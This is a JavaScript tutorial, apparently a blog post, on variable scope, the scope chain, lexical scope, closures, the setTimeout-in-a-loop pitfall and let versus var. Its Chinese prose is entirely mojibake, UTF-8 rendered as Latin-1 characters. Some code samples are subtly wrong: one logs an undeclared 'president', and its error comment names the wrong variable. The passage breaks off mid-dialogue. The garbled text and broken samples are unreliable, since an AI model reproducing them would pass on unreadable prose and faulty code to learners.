ä»¥é€™å€‹ä¾‹å­ä¾†èªªï¼Œaçš„ä½œç”¨åŸŸæ˜¯ test é€™å€‹ function ä¸­çš„ç¯„åœã€‚ä¸€æ—¦è¶…å‡ºä½œç”¨åŸŸï¼Œä½ å°±æ²’è¾¦æ³•å­˜å–åˆ°è®Šæ•¸çš„å€¼ã€‚ åœ¨ ES6 çš„ let è·Ÿ const å‡ºç¾ä¹‹å‰ï¼Œåªæœ‰ function èƒ½å¤ ç”¢ç”Ÿå‡ºä½œç”¨åŸŸã€‚è€Œ let è·Ÿ const æ¨å‡ºå¾Œï¼Œå¤šäº†ä¸€å€‹ block çš„ä½œç”¨åŸŸã€‚ å…¨åŸŸä½œç”¨åŸŸèˆ‡å€åŸŸä½œç”¨åŸŸä½œç”¨åŸŸé‚„å¯ä»¥åˆ†ç‚ºã€Œå…¨åŸŸã€è·Ÿã€Œå€åŸŸã€ã€‚å‰›å‰›ç”¨ function è£½é€ å‡ºçš„ä½œç”¨åŸŸå°±æ˜¯å±¬æ–¼å€åŸŸçš„ä½œç”¨åŸŸã€‚é‚£ä»€éº¼æ˜¯å…¨åŸŸä½œç”¨åŸŸï¼Ÿ å…¨åŸŸä½œç”¨åŸŸæŒ‡çš„æ˜¯ç›´æ¥å¯«åœ¨æœ€å¤–å±¤çš„è®Šæ•¸ã€‚ä¸€å€‹åœ¨å…¨åŸŸä½œç”¨åŸŸä¸‹çš„è®Šæ•¸ï¼Œä½ ä¸ç®¡åœ¨å“ªè£¡éƒ½å¯ä»¥å­˜å–å¾—åˆ°é€™å€‹è®Šæ•¸ï¼š 12345var globalScope = 10function test() { console.log(globalScope) // 10}test() // 10 æ‰€ä»¥åœ¨å‰é¢çš„ä¾‹å­ä¸­ä½ æœƒç™¼ç¾ï¼Œä¸€å€‹ function å¯ä»¥å»å­˜å–å¤–é¢çš„è®Šæ•¸ï¼Œä½†å¤–é¢å»æ²’æœ‰è¾¦æ³•å»å­˜å–ä¸€å€‹ function ä¸­çš„è®Šæ•¸ã€‚ å¦‚æœç”¨ç”Ÿæ´»åŒ–ä¸€é»çš„ä¾‹å­ä¾†èªªçš„è©±ï¼Œä¸€å€‹è™•åœ¨å…¨åŸŸä½œç”¨åŸŸä¸­çš„è®Šæ•¸å°±å¥½åƒæ˜¯åœ‹éš›å·¨æ˜Ÿï¼Œä¸ç®¡æ˜¯å“ªå€‹åœ°æ–¹ï¼Œå¤§å®¶éƒ½èªè­˜ä»–ã€‚åä¹‹ï¼Œä¸€å€‹è™•åœ¨ function ä¸­çš„è®Šæ•¸å°±å¥½åƒæ˜¯åœ¨åœ°çš„å¶åƒï¼Œä¹Ÿè¨±ç•¶åœ°çš„äººéƒ½çŸ¥é“ä»–æ˜¯èª°ï¼Œä½†æ˜¯ä¸€æ—¦å‡ºäº†é€™å€‹å€åŸŸï¼ˆfunctionï¼‰ï¼Œåˆ¥äººå°±ä¸è¦‹å¾—çŸ¥é“ä»–æ˜¯èª°ã€‚ ä¸€å€‹åœ°å€è£¡é¢é‚„å¯ä»¥åœ¨åŒ…å«å¦ä¸€å€‹åœ°å€ï¼Œå°±åƒå°ç£é€™å€‹åœ°å€è£¡é¢å¯ä»¥æœ‰é«˜é›„å¸‚ï¼Œè€Œé«˜é›„å¸‚é€™å€‹åœ°å€è£¡é¢é‚„å¯ä»¥æœ‰ä¸‰æ°‘å€ï¼Œå¥—ç”¨åˆ° function ä¸Šä¹Ÿæ˜¯åŒæ¨£çš„æ¦‚å¿µã€‚è€Œä½åœ¨å°ç£çš„äººä¹Ÿè¨±éƒ½çŸ¥é“å°ç£çš„ç¸½çµ±æ˜¯èª°ï¼Œä½†ä¸ä¸€å®šæ›‰å¾—é«˜é›„å¸‚çš„å¸‚é•·æ˜¯èª°ï¼Œå› ç‚ºé‚£è¶…å‡ºäº†é«˜é›„å¸‚é€™å€‹ï¼ˆfunctionï¼‰çš„ç¯„åœã€‚ å¦‚æœæŠŠä¸Šé¢çš„æ¦‚å¿µè½‰æ›æˆç¨‹å¼ç¢¼å¤§æ¦‚æœƒåƒé€™æ¨£å­ï¼š 1234567891011121314function taiwan() { var presidentOfTaiwan = 'å°ç£ç¸½çµ±' function kaohsiung() { var mayorOfKaohsiung = 'é«˜é›„å¸‚é•·' function sanminDistrict() { var mayorOfSanminDistrict = 'ä¸‰æ°‘å€å€é•·' console.log(president) // 'å°ç£ç¸½çµ±' } sanminDistrict() console.log(mayorOfSanminDistrict) // Uncaught ReferenceError: a is not defined } kaohsiung()}taiwan() æ‰€ä»¥ï¼Œåœ¨ä¸€å€‹ function è£¡é¢æˆ‘å€‘å¯ä»¥å»å­˜å–åœ¨å¤–é¢çš„è®Šæ•¸ï¼Œä½†æ˜¯åœ¨å¤–é¢æ²’æœ‰è¾¦æ³•å­˜å–åˆ° function å…§çš„è®Šæ•¸ã€‚ 1234567function outter() { var a = 100 function inner() { console.log(a) // 100 } inner()} å° inner é€™å€‹ function ä¾†èªªï¼Œa ä¸¦ä¸æ˜¯å®ƒè‡ªå·±çš„è®Šæ•¸ï¼Œè€Œé€™ç¨®ä¸åœ¨è‡ªå·±ä½œç”¨åŸŸä¸­çš„è®Šæ•¸ç¨±ç‚ºã€Œè‡ªç”±è®Šæ•¸ï¼ˆfree variableï¼‰ã€ ä½œç”¨åŸŸéˆï¼ˆScope chainï¼‰ä¸€æ¨£çœ‹åˆ°å‰›å‰›çš„ä¾‹å­ï¼š 1234567function outter() { var a = 100 function inner() { console.log(a) // 100 } inner()} å° inner ä¾†èªªï¼Œa æ˜¯ä¸€å€‹è‡ªç”±è®Šæ•¸ï¼ˆå› ç‚ºä¸åœ¨è‡ªå·±çš„ä½œç”¨åŸŸä¸­ï¼‰ã€‚æ­¤æ™‚ç•¶ inner è¦å°å‡ºé€™å€‹è®Šæ•¸æ™‚ï¼Œå®ƒå°±æœƒåˆ°å¤–å±¤å»æ‰¾æœ‰æ²’æœ‰é€™å€‹è®Šæ•¸å­˜åœ¨ï¼šä¸€é–‹å§‹å…ˆåœ¨ inner çš„ä½œç”¨åŸŸä¸­å°‹æ‰¾ -&gt; æ¥è‘—å†åˆ° outter çš„ä½œç”¨åŸŸå°‹æ‰¾ -&gt; æ¥è‘—å†åˆ° global çš„ä½œç”¨åŸŸå°‹æ‰¾ï¼Œæœ€å¾Œå¦‚æœéƒ½æ‰¾ä¸åˆ°çš„è©±å°±æœƒæ‹‹å‡ºéŒ¯èª¤ã€‚ ä¸æ–·å¾€ä¸Šæ‰¾çš„é€™å€‹å‹•ä½œï¼Œå°±æ˜¯ä¸€å€‹ã€Œä½œç”¨åŸŸéˆã€ã€‚ éœæ…‹ä½œç”¨åŸŸèˆ‡å‹•æ…‹ä½œç”¨åŸŸä½œç”¨åŸŸå…¶å¯¦é‚„å¯ä»¥åˆ†æˆã€Œéœæ…‹ã€èˆ‡ã€Œå‹•æ…‹ã€ï¼Œä¾†çœ‹ä¸€å€‹ä¾‹å­ï¼š 123456789var a = 100function echo() { console.log(a) // 100 or 200?}function test() { var a = 200 echo()}test() æ‡‰è©²å¾ˆæ··äº‚å§ï¼Ÿä½†æ­£ç¢ºç­”æ¡ˆæ˜¯ 100ã€‚ä¸éé€™æ˜¯ä»¥ JS ç‚ºå‰æä¹‹ä¸‹çš„çµæœï¼Œå¦‚æœä½ ä½¿ç”¨å…¶ä»–çš„ç¨‹å¼èªè¨€ä¾†è·‘çš„è©±ï¼Œç­”æ¡ˆæœ‰å¯èƒ½æœƒè®Šæˆ 200ã€‚ ç‚ºä»€éº¼æœƒæœ‰é€™æ¨£çš„å·®ç•°ï¼Ÿé€™è·Ÿç¨‹å¼èªè¨€å¦‚ä½•æ±ºå®šã€Œä½œç”¨åŸŸã€é€™ä»¶äº‹æœ‰é—œï¼ˆæˆ–æ›å¥è©±èªªï¼Œå¦‚ä½•æ±ºå®šè‡ªç”±è®Šæ•¸çš„å€¼ï¼‰ åœ¨ JS ä¸­çš„ä½œç”¨åŸŸè¢«å®šç¾©ç‚ºæ˜¯éœæ…‹çš„ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä¸€å€‹ä½œç”¨åŸŸåœ¨ function è¢«ã€Œå®£å‘Šã€çš„ç•¶ä¸‹å°±å·²ç¶“æ±ºå®šäº†ã€‚ä¸ç®¡ä½ ä¹‹å¾Œåœ¨å“ªè£¡ã€Œå‘¼å«ã€é€™å€‹ functionï¼Œå®ƒçš„ä½œç”¨åŸŸéƒ½ä¸æœƒæ”¹è®Šã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æœƒç¨±ä¹‹ç‚ºã€Œéœæ…‹ä½œç”¨åŸŸã€ï¼Œå› ç‚ºå®ƒä¸æœƒè®Šä¾†è®Šå»çš„ã€‚ åä¹‹ï¼Œå¦‚æœä¸€å€‹ç¨‹å¼èªè¨€æ˜¯æ¡ç”¨å‹•æ…‹ä½œç”¨åŸŸï¼Œé‚£éº¼å‰›å‰›çš„ç¯„ä¾‹æœƒè¼¸å‡ºçš„çµæœå°±æœƒæ˜¯ 200ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œä½œç”¨åŸŸæ˜¯åœ¨ function è¢«ã€Œå‘¼å«ã€çš„æ™‚å€™æ‰è¢«å‹•æ…‹æ±ºå®šçš„ã€‚ä½ å¯ä»¥æƒ³æƒ³çœ‹ JS ä¸­æœ€é›£æçš„ this ï¼Œå…©è€…çš„è§€å¿µå¾ˆé¡ä¼¼ã€‚JS ä¸­çš„ this å€¼å°±æ˜¯åœ¨ç¨‹å¼åŸ·è¡Œçš„æ™‚å€™æ‰è¢«æ±ºå®šçš„ï¼Œæ‰€ä»¥ä½ å¾ˆå®¹æ˜“ææ··å®ƒçš„å€¼åˆ°åº•æ˜¯ä»€éº¼ï¼Œå› ç‚ºå®ƒæœƒè®Šä¾†è®Šå»çš„ã€‚ äº‹å¯¦ä¸Šï¼Œéœæ…‹ä½œç”¨åŸŸçš„æ›´æ­£å¼çš„ç¨±å‘¼æ˜¯ã€Œlexical scopeã€ï¼Œå¯ä»¥ç¿»ä½œèªå½™ç¯„ç–‡ï¼Œæˆ–æ˜¯è©æ³•ä½œç”¨åŸŸã€‚ è¦ç†è§£ä»€éº¼æ˜¯ lexical scope ï¼Œä½ å¾—å»ç†è§£ç¨‹å¼ç¢¼åœ¨ç·¨è­¯éç¨‹çš„æ­¥é©Ÿã€‚ä½†ç¸½è€Œè¨€ä¹‹ï¼Œç›®å‰ä½ åªè¦çŸ¥é“ lexical scope æŒ‡çš„å°±æ˜¯åœ¨ç·¨è­¯çš„æ™‚å€™å°±å·²ç¶“æ±ºå®šå¥½ä½œç”¨åŸŸæ˜¯ä»€éº¼ï¼Œé€™æ¨£å­å°±å¤ äº†ã€‚ é–‰åŒ…ç†è§£å®Œä½œç”¨åŸŸå¾Œï¼Œå°±å¯ä»¥ä¾†è«‡è«‡ä»€éº¼æ˜¯é–‰åŒ…äº†ã€‚ å…ˆè®“æˆ‘å€‘ä¾†çœ‹å€‹ç¯„ä¾‹å§ï¼š 12345678function test() { var a = 10 function inner() { console.log(a) // 10 } inner()}test() å—¯ï¼Œç›¸ä¿¡ä½ æ‡‰è©²ç†è§£é€™æ®µç¨‹å¼ç¢¼çš„æ„æ€ã€‚é€™è£¡å®£å‘Šäº†ä¸€å€‹ test function ï¼Œç„¶å¾Œè£¡é¢åˆå®£å‘Šäº†ä¸€å€‹ inner function ï¼Œä¸¦ä¸” inner æœƒå°å‡º a çš„å€¼ï¼Œæœ€å¾Œ test æœƒåŸ·è¡Œ inner é€™å€‹ functionã€‚ ä½†æ˜¯ç¾åœ¨æˆ‘å€‘å¦‚æœä¸è¦åŸ·è¡Œ inner é€™å€‹ functionï¼Œè€Œæ˜¯å›å‚³å‘¢ï¼Ÿ 123456789function test() { var a = 10 function inner() { console.log(a) } return inner}var inner = test()inner() å¾ˆç¥å¥‡çš„æ˜¯ï¼Œæœ€å¾Œé‚„æ˜¯æœƒå¾—åˆ° 10ã€‚ ç‚ºä»€éº¼ç¥å¥‡ï¼Ÿå› ç‚ºé€šå¸¸ä¸€å€‹ function åœ¨åŸ·è¡Œå®Œæˆå¾Œï¼Œæœƒåšä¸€å€‹ã€Œè³‡æºé‡‹æ”¾ã€çš„å‹•ä½œã€‚ä¹Ÿå°±æ˜¯èªªåœ¨ test åœ¨åŸ·è¡ŒçµæŸå¾Œï¼Œç”¨ä¾†å„²å­˜è®Šæ•¸ a çš„å€¼è¨˜æ†¶é«”ç©ºé–“ä¹Ÿè¦è¢«é‡‹æ”¾å‡ºä¾†ã€‚ä½†æ˜¯ï¼Œæˆ‘å€‘åœ¨å‘¼å« inner çš„æ™‚å€™ï¼Œå±…ç„¶é‚„æ˜¯èƒ½å­˜å–åˆ° aï¼ a è¢«ã€Œé—œåœ¨ã€ inner è£¡é¢çš„é€™å€‹è¡Œç‚ºï¼Œå°±å«åšã€Œé–‰åŒ…ï¼ˆClosureï¼‰ã€ã€‚æˆ‘ä¹Ÿæœ‰çœ‹éå¦å¤–ä¸€ç¨®è§£é‡‹æ˜¯ã€Œè®“ function è¨˜ä½ç•¶æ™‚ä½œç”¨åŸŸä¸‹çš„è®Šæ•¸å€¼ï¼Œå³ä¾¿ function å·²ç¶“é›¢é–‹äº†é‚£å€‹ä½œç”¨åŸŸã€ã€‚ä»¥ inner ç•¶æ™‚çš„ç’°å¢ƒä¾†æ€è€ƒçš„è©±ï¼ŒæŒ‰ç…§ä½œç”¨åŸŸéˆï¼Œæœƒåœ¨ test è£¡é¢æ‰¾åˆ° a çš„å€¼ã€‚ é‚£éº¼ï¼Œé–‰åŒ…åˆæ˜¯æ€éº¼å¼•ç™¼çš„ï¼Ÿå…¶å¯¦æœƒå°è‡´é–‰åŒ…ç™¼ç”Ÿçš„åŸå› æ˜¯æˆ‘åœ¨ function è£¡é¢å›å‚³äº†ä¸€å€‹ functionï¼Œå› ç‚ºé€™å€‹å‹•ä½œï¼Œæ‰€ä»¥æ‰æœƒå¾—å‡ºæ˜æ˜çµæŸå®Œç•¢å°±æ‡‰è©²æ¶ˆå¤±çš„æ±è¥¿å»é‚„è¢«é—œæ³¨çš„é€™ç¨®ç¾è±¡ã€‚ å¯¦éš›æ‡‰ç”¨åœ¨ç†è§£é–‰åŒ…æ˜¯ä»€éº¼å¾Œï¼Œä½ æ‡‰è©²æœƒå¥½å¥‡é–‰åŒ…å¯ä»¥åšä»€éº¼ï¼Ÿå…¶ä¸­æœ€å¸¸è¢«æ‹¿ä¾†æ‡‰ç”¨çš„æƒ…æ³ï¼Œæ˜¯æŠŠè®Šæ•¸éš±è—åœ¨è£¡é¢ï¼Œè®“å¤–é¢æ²’è¾¦æ³•å­˜å–åˆ°é€™å€‹è®Šæ•¸ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æœ‰ä¸€å€‹è®Šæ•¸ç”¨ä¾†ä»£è¡¨ PeaNu çš„å­˜æ¬¾é‡‘é¡ï¼Œæœ‰ä¸€å€‹ function æ˜¯ç”¨ä¾†ææ¬¾ï¼Œä½†é€™è£¡è¨­ç½®äº†ä¸€å€‹ä¸Šé™ï¼Œé‚£å°±æ˜¯æœ€å¤šåªèƒ½é ˜ 1000ï¼š 123456var PeaNusMoney = 10000function getMoney(n) { PeaNusMoney -= n &gt; 1000 ? 1000 : n // æœ€å¤šåªèƒ½é ˜ 1000}getMoney(2000) // åªè¢«æ‰£ 1000console.log(PeaNusMoney) // 9000 ä½ æ‡‰è©²ä¹Ÿç™¼ç¾åˆ°äº†ï¼Œå³ä¾¿æˆ‘å€‘ä¸é€é functionï¼Œä¹Ÿå¯ä»¥ç›´æ¥å»ä¿®æ”¹è®Šæ•¸çš„å€¼ï¼š 123456var PeaNusMoney = 10000function getMoney(n) { PeaNusMoney -= n &gt; 1000 ? 1000 : n // æœ€å¤šåªèƒ½é ˜ 1000}PeaNusMoney -= 2000 // ç›´æ¥ä¿®æ”¹è®Šæ•¸å€¼console.log(PeaNusMoney) // 8000 å„˜ç®¡æˆ‘å€‘å¯«äº† getMoney é€™å€‹ function ä¾†æ“ä½œï¼Œä½†è®Šæ•¸é‚„æ˜¯æš´éœ²åœ¨å¤–é¢ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¿®æ”¹é€™å€‹è®Šæ•¸ã€‚ä½†é€™å€‹æ™‚å€™å¦‚æœæ”¹ç”¨é–‰åŒ…çš„è©±ï¼Œä¸–ç•Œå°±ä¸ä¸€æ¨£äº†ï¼š 12345678910111213141516171819202122function PeaNusBank() { var money = 10000 // ç”¨ä¾†ææ¬¾ function get(n) { money -= n &gt; 1000 ? 1000 : n // æœ€å¤šåªèƒ½é ˜ 1000 } // ç”¨ä¾†é¡¯ç¤ºé¤˜é¡ function show() { console.log(money) } // æŠŠ function åŒ…åœ¨ä¸€å€‹ç‰©ä»¶è£¡å›å‚³ return { showMoney: show, getMoney: get }}var myBank = PeaNusBank()myBank.getMoney(2000) // åªæœƒè¢«æ‰£ 1000myBank.showMoney() // 9000money -= 2000 // Uncaught ReferenceError: money is not defined ç¾åœ¨æˆ‘å€‘æŠŠè®Šæ•¸éš±è—åœ¨ PeaNusBank è£¡é¢ï¼Œå¦‚æœä½ æƒ³è¦ä¿®æ”¹è®Šæ•¸çš„å€¼ï¼Œå°±åªèƒ½é€éæˆ‘æš´éœ²å‡ºå»çš„ get å‡½å¼ä¾†ä¿®æ”¹ã€‚ æ—¢ç„¶éƒ½æåˆ°é–‰åŒ…äº†ï¼Œé‚£ä¸å¾—ä¸æä¸€å€‹å¾ˆç¶“å…¸çš„ä¾‹å­ï¼š 12345for (var i = 0; i &lt;= 5; i++) { setTimeout(function () { console.log(i) }, 1000)} åœ¨ä¸çŸ¥é“é–‰åŒ…æ˜¯ä»€éº¼ä»¥å‰ï¼Œä½ å¯èƒ½æœƒä»¥ç‚ºä¸Šé¢çš„ç¨‹å¼ç¢¼æœƒåœ¨ 1 ç§’å¾Œå°å‡º 0, 1, 2, 3, 4, 5ã€‚ä¸éæ­£ç¢ºçš„ç­”æ¡ˆæ˜¯å…­å€‹ 6ã€‚ ä½ åŸæœ¬ä»¥ç‚ºæ˜¯é€™æ¨£å­ï¼š 12345678setTimeout(function () { console.log(0)}, 1000)setTimeout(function () { console.log(1)}, 1000)... ä½†å¯¦éš›ä¸Šæ˜¯é€™æ¨£å­ï¼š 12345678setTimeout(function () { console.log(i)}, 1000)setTimeout(function () { console.log(i)}, 1000)... å…¶å¯¦ä»”ç´°æƒ³æƒ³çš„è©±ï¼Œæœƒç™¼ç¾ä¸‹é¢é€™æ¨£æ¯”è¼ƒåˆç†ï¼Œå› ç‚ºæˆ‘å€‘åªæœ‰è®“ setTimeout è£¡çš„ function åœ¨ä¸€ç§’å¾Œå»å°å‡º i çš„å€¼ï¼Œè€Œä¸æ˜¯ç›´æ¥åŸ·è¡Œé€™å€‹ functionã€‚ æ‰€ä»¥åœ¨ä¸€ç§’å¾Œï¼Œi æœƒæ˜¯ä»€éº¼ï¼Ÿåœ¨ä¸€ç§’éå¾Œï¼Œè¿´åœˆæ—©å°±å·²ç¶“è·‘å®Œäº†ï¼Œæ‰€ä»¥ i æœƒè®Šæˆ 6ï¼ˆåœ¨ i=5 è·‘å®Œå¾Œï¼Œi++è®Šæˆ 6ï¼Œæœ€å¾Œä¸ç¬¦åˆè¿´åœˆä¸­çš„æ¢ä»¶ï¼Œè·³å‡ºè¿´åœˆï¼‰ï¼Œæ‰€ä»¥ä¸€ç§’å¾Œå°±æœƒè¹¦å‡ºå…­å€‹ 6ã€‚ é‚£è¦æ€éº¼åšæ‰æœƒè®Šæˆæˆ‘å€‘è¦çš„çµæœå‘¢ï¼ŸåŠ ä¸Š functionï¼ 12345678function showNum(n) { return function () { console.log(n) }}for (var i = 0; i &lt;= 5; i++) { setTimeout(showNum(i), 1000)} åœ¨è¿´åœˆä¸­ï¼Œæˆ‘å€‘æ¯ä¸€åœˆæœƒå»ºç«‹ä¸€å€‹ setTimeoutï¼Œé€™å€‹ setTimeout åœ¨ä¸€ç§’å¾ŒæœƒåŸ·è¡Œ showNum(i) å›å‚³çš„ functionã€‚ å¦‚æœä½ æœ‰é»æ··äº‚çš„è©±ï¼Œä»”ç´°å›æƒ³ä¸€ä¸‹é–‰åŒ…çš„ç‰¹æ€§ï¼šè¨˜ä½ function åœ¨ç•¶æ™‚ç’°å¢ƒçš„è®Šæ•¸å€¼ã€‚ åŸæœ¬çš„ showNum(i) åœ¨åŸ·è¡ŒçµæŸå¾Œï¼Œi å°±æœƒè¢«é‡‹æ”¾ã€‚ä½†æ˜¯ç¾åœ¨æˆ‘å€‘åœ¨è£¡é¢å›å‚³äº†ä¸€å€‹æ–°çš„ functionï¼Œé€™å€‹å‹•ä½œå°±å»ºç«‹äº†ä¸€å€‹é–‰åŒ…ï¼Œæ‰€ä»¥ i æœƒè¢«ã€Œé—œåœ¨ã€é€™å€‹æ–°çš„ function è£¡é¢ã€‚æœ€å¾Œç•¶ setTimeout åœ¨ä¸€ç§’éå¾Œå›ä¾†åŸ·è¡Œé€™å€‹ function æ™‚ï¼Œæœƒå°å‡ºç•¶æ™‚ showNum(i) å‚³é€²å»çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æœ€å¾Œä½ çœ‹åˆ°çš„çµæœã€‚ é€™å€‹ä¾‹å­ä¹Ÿå¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 12345678for (var i = 0; i &lt;= 5; i++) { // IIFE ;(function (number) { setTimeout(function () { console.log(number) }, 1000) })(i)} å…¶å¯¦å°±æ˜¯é€™å€‹çš„ç°¡åŒ–ç‰ˆï¼š 12345678for (var i = 0; i &lt;= 5; i++) { printNumber(i)}function printNumber (number) { setTimeout(function() { console.log(number) }, 1000)} è·Ÿç¬¬ä¸€å€‹æ–¹æ³•çš„æ¦‚å¿µæ˜¯ä¸€æ¨£çš„ï¼Œéƒ½æ˜¯è—‰ç”±é–‰åŒ…ä¾†æŠŠ i é—œåœ¨ function è£¡é¢ã€‚ï¼ˆä¹Ÿå¯ä»¥æ›å€‹èªªæ³•ï¼Œæ¯æ¬¡è¿´åœˆéƒ½æœƒåŸ·è¡Œä¸€å€‹æ–°çš„ functionï¼Œä¹Ÿå°±å»ºç«‹äº†ä¸€å€‹æ–°çš„ä½œç”¨åŸŸï¼‰ æœ€å¾Œåšä¸€å€‹è£œå……ï¼Œåœ¨ ES6 ä¹‹å¾Œæœ‰äº† block scope çš„ä½œç”¨åŸŸã€‚ä»¥å‰›å‰›çš„ä¾‹å­èªªï¼Œå¦‚æœä½ è¦ºå¾—ç”¨ function ä¾†ç”¢ç”Ÿå‡ºä¸€å€‹é–‰åŒ…å¾ˆéº»ç…©çš„è©±ï¼Œåªè¦æŠŠè¿´åœˆè£¡é¢çš„ var æ”¹æˆ let å°±è¡Œäº†ï¼š 12345for (let i = 0; i &lt;= 5; i++) { setTimeout(function () { console.log(i) }, 1000)} let æœƒè£½é€ å‡º block scopeï¼Œä¹Ÿå°±æ˜¯èªªæ¯ä¸€æ¬¡è¿´åœˆéƒ½æœƒç”¢ç”Ÿå‡ºä¸€å€‹æ–°çš„ä½œç”¨åŸŸï¼Œåƒé€™æ¨£ï¼š 1234567891011121314{ // å¡Šç´šä½œç”¨åŸŸ let i = 0 setTimeout(function() { console.log(i) // 0 })}{ // å¡Šç´šä½œç”¨åŸŸ let i = 1 setTimeout(function() { console.log(i) // 1 })}... block scope èˆ‡ function scope çš„å·®ç•°æ˜¯ï¼šå‰è€…æ˜¯ä»¥ { } ä¾†åŠƒåˆ†ä½œç”¨åŸŸï¼›å¾Œè€…æ˜¯ä»¥ function ä¾†åŠƒåˆ†ï¼š 1234567891011{ let i = 0 function test() { return function () { console.log(i) } }}const a = test() // è¢«é—œåœ¨ function è£¡çš„ ia() // 0console.log(i) // Uncaught ReferenceError: i is not defined å¦‚æœæ˜¯ block scopeï¼Œç•¶é›¢é–‹äº† { } æ™‚ï¼Œå°±æœƒé€²è¡Œé‡‹æ”¾ã€‚æ‰€ä»¥ä½ åœ¨å¤–é¢å­˜å–ä¸åˆ° iï¼ˆæ²’æœ‰é–‰åŒ…çš„æƒ…æ³ï¼‰ã€‚ä½†å¦‚æœæŠŠ let æ”¹æˆ varï¼Œæƒ…æ³å°±åˆä¸ä¸€æ¨£äº†ï¼Œvar åªèƒ½é€é function ä¾†ç”¢ç”Ÿå‡ºä½œç”¨åŸŸï¼Œæ‰€ä»¥ï¼š 1234567891011{ var i = 0 function test() { return function () { console.log(i) } }}const a = test() // è¢«é—œåœ¨ function è£¡çš„ ia() // 0console.log(i) // 0 é€™æ™‚å€™çš„ i å°±ç­‰æ–¼æ˜¯å…¨åŸŸä½œç”¨åŸŸä¸‹çš„è®Šæ•¸ï¼Œæ‰€ä»¥å³ä¾¿ä¸ä½¿ç”¨é–‰åŒ…ï¼Œä¹Ÿèƒ½å­˜å–åˆ°iã€‚ ä»¥ä¸Šå°±æ˜¯é—œæ–¼é–‰åŒ…çš„åŸºæœ¬è§€å¿µï¼Œå…¶å¯¦é–‰åŒ…å¯ä»¥è¨è«–çš„æ±è¥¿é‚„æœ‰å¾ˆå¤šï¼Œä½†æˆ‘ç†è§£çš„é‚„ä¸å¤ æ·±ï¼Œæ‰€ä»¥æš«æ™‚åœ¨é€™è£¡æ‰“ä½ã€‚ä»¥å¾Œç­‰æˆ‘äº†è§£æ›´å¤šçš„æ™‚å€™ï¼Œåœ¨å›ä¾†ç”¨æ›´æ¸…æ¥šçš„æ–¹å¼ä¾†åšè§£é‡‹ã€‚ å¦‚æœä½ æƒ³ç†è§£çš„æ›´æ·±å…¥çš„è©±ï¼Œå¯ä»¥çœ‹é€™ç¯‡æ–‡ç«  çµ¦è‡ªå·±åšçš„ç­†è¨˜åœ¨åŠå¤œç¡è¦ºæ™‚ï¼Œæˆ‘æ€è€ƒäº†ä¸€äº›æ›´å¤šèƒ½å¤ ç”¢ç”Ÿé–‰åŒ…çš„å¯«æ³•ï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†åšå€‹ç­†è¨˜ï¼š 1234567function myFamily() { var myBrother = 'PeaNu' setTimeout(function () { console.log(myBrother) }, 1000)}myFamily() // ä¸€ç§’å¾Œå°å‡º 'PeaNu' æˆ‘åœ¨ myFamily è£¡å®£å‘Šäº†ä¸€å€‹ myBrotherï¼Œä¸¦ä¸”æœƒåŸ·è¡Œ setTimeoutï¼Œåœ¨ä¸€ç§’å¾Œå°å‡º 'PeaNu'ã€‚ä½†å¯¦éš›ä¸Š setTimeout ä¸­çš„ function åœ¨åŸ·è¡Œæ™‚ï¼Œå·²ç¶“è„«é›¢äº† myFamily æ‰€ç”¢ç”Ÿçš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ç…§ç†ä¾†èªªæ‡‰è©²æœƒè·³å‡ºéŒ¯èª¤è¨Šæ¯ï¼Œä¸éå¯¦éš›å»å¯ä»¥å¾—åˆ°æ­£ç¢ºçš„å€¼ï¼š'PeaNu'ã€‚ æˆ‘æƒ³é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æœƒéœ€è¦é–‰åŒ…çš„ä¸€ç¨®åŸå› å§ï¼Ÿå¦‚æœæ²’æœ‰é–‰åŒ…ï¼Œè®“ function èƒ½å¤ æœ‰è¨˜ä½ç•¶æ™‚ä½œç”¨åŸŸä¸‹çš„è®Šæ•¸èƒ½åŠ›ï¼Œäº‹æƒ…å¯èƒ½å°±æœƒè®Šæˆé€™æ¨£ï¼š 12345678æˆ‘ : å˜¿ï¼ŒsetTimeoutï¼Œå¹«æˆ‘åœ¨ä¸€ç§’å¾Œå« function å°å‡ºæˆ‘å“¥çš„åå­—ï¼ˆmyBrotherï¼‰å¥½å—ï¼ŸsetTimeout : å¥½å“¦ï¼Œæ²’å•é¡Œï¼( setTimeout å‘Šè¨´ function åœ¨ä¸€ç§’å¾Œå°å‡º myBrother )---- ä¸€ç§’éå¾Œ ----functionï¼šä¸å¥½æ„æ€ï¼ŒmyBrother å“ªä½ï¼Ÿæ˜¯é¦™è•‰æ‰äº†å°±æœƒç§ ooå¨˜ é‚£ä½å—ï¼Ÿæˆ‘ï¼š... é‚„æœ‰å¦å¤–ä¸€ç¨®æƒ…å¢ƒæ˜¯é€™æ¨£ï¼Œæˆ‘å€‘å…ˆçœ‹ä¸€æ®µç¨‹å¼ç¢¼ï¼š 12345678var prettiestGirl = 'è¨±ç´”ç¾'function sayWhoIsPrettiestGirl() { var prettiestGirl = 'æ—å¿—ç²' setTimeout(function () { console.log(prettiestGirl) }, 1000)}sayWhoIsPrettiestGirl() ç¾åœ¨å‡è¨­æ—å¿—ç²æ˜¯ç™½é›ªå…¬ä¸»è£¡é¢çš„å·«å©†å¥½äº†ï¼Œä»–æ¯å¤©éƒ½æœƒå•é­”é¡èª°æ˜¯æœ€æ¼‚äº®çš„å¥³äººã€‚ ç•¶æ™‚çš„é­”é¡æ˜¯ç”¨é«˜ç§‘æŠ€å¯«çš„ä¸€å€‹æ™ºæ…§å‹ AI é­”é¡ï¼ˆæˆ‘çŸ¥é“é€™è¨­å®šå¾ˆçˆ›ï¼Œä½†ä½ å°±æ¥å—å§ã€‚ï¼‰ï¼Œåªè¦å•å®ƒå•é¡Œï¼Œä»–ä¸€ç§’å¾Œå°±æœƒå‘Šè¨´ä½ ç­”æ¡ˆã€‚ä½†ç¾åœ¨æœ‰å€‹é§­å®¢æ•…æ„åœ¨é­”é¡çš„ç¨‹å¼è£¡é¢åŠ æ–™ï¼Œå¸Œæœ›è®“é­”é¡å›ç­”å‡º 'è¨±ç´”ç¾'ï¼Œæ‰€ä»¥ï¼š 12345678æ—å¿—ç² : 